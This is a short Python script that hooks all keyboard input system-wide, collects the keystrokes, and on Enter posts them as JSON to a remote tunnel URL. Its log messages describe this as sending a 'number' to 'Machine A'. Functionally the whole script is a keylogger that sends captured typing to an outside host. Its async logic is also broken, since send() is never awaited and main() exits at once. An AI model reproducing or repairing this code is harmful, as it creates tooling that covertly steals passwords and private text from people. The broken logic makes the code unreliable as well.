import aiohttp
import asyncio
import keyboard

cur = []

async def sendNum(number, url, payload):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, json=payload) as response:
                if response.status == 200:
                    print(f"Number {number} sent successfully to Machine A")
                else:
                    print("Failed to send number to Machine A")
        except aiohttp.ClientError as e:
            print(f"Error sending number {number} to Machine A: {e}")

def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        if event.name == 'enter':
            send()
        elif event.name == "space":
            cur.append(" ")
        elif event.name == "backspace":
            pass
        else:
            cur.append(event.name)

async def send():
    url = "https://famous-parrots-remain.loca.lt"
    userInput = "".join(cur)
    payload = {"number": userInput}
    await sendNum(userInput, url, payload)

def main():
    keyboard.hook(on_key_event)

if __name__ == "__main__":
    asyncio.run(main())
